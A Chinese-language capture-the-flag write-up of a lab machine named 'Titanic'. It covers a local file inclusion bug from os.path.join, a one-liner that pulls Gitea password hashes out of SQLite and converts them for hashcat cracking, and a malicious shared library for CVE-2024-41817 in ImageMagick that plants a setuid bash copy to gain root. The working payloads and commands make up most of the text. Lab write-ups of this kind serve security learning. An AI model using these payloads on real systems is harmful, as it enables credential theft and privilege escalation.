# Titanic

- 練習日期:   2026/03/13
- 考點:       LFI、Dynamic Library Hijacking

## LFI

首先發現後台在處理 request 的時候會把 `ticket` 做 os.path.join()，這裡會有 LFI (Local File Inclusion) 的問題:

```python
 json_filepath = os.path.join(TICKETS_DIR, json_filename)
```

如果今天 json_filename 輸入 `/etc/passwd` 的話 (亦即傳入路徑起始為 `/`)，os.path.join() 會把前面的 TICKETS_DIR 給丟掉，直接默認路徑為 `/etc/passwd`。

## SQLite

1. gitea 的密碼是以 PBKDF2-HMAC-SHA256 的方式來儲存密碼，作法為對密碼和 salt 進行 50000 次的 HMAC-SHA256 運算，最後把結果以 hex 的形式儲存到資料庫中。

2. 直接使用 sqlite3 來讀取資料庫 XXX.db，不過 hashcat 對 PBKDF2-HMAC-SHA256 的爆破只支援 base64 的格式，因此，我們需要把資料庫中的 password 和 salt 撈出來，先從 hex 還原成 binary，再轉成 base64 的格式，存成一個檔案，然後再用 hashcat 來爆破。hashcat 吃 PBKDF2-HMAC-SHA256 的格式是 `username:sha256:50000:salt:digest`，其中 digest 是對密碼和 salt 進行 50000 次的 HMAC-SHA256 運算後的結果。

```bash
# 直接複製下面這段
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes

# 輸出長這樣
administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```

## Dynamic Library Hijacking

這邊要介紹 CVE-2024-41817。這個漏洞是 magick <= 7.1.1-35 的環境中，執行時本應去系統預設路徑找動態函式庫 (.so 檔)，但卻會先去當前目錄找，因此我們可以 fake 一個自製的 .so 檔放在當前目錄，並由具有 root 權限的 crontab 來執行它。

```c
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("id");
    exit(0);
}
EOF
```

其中，-x c 是用來指定輸入檔案的語言為 C，-shared 是用來編譯成動態函式庫的參數，-fPIC 是用來生成位置獨立程式碼的參數，-o 是用來指定輸出的檔案名稱。

接著我們把檔案改成這樣：

```c
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cp /bin/bash /tmp/ouo; chmod 6777 /tmp/ouo");
    exit(0);
}
EOF
```

接著到 /tmp 目錄下去執行 ouo，記得要帶 -p 參數 (Privileged 特權模式，沒帶會被降權)，這樣就可以拿到 root 權限了。

```bash
/tmp/ouo -p
```
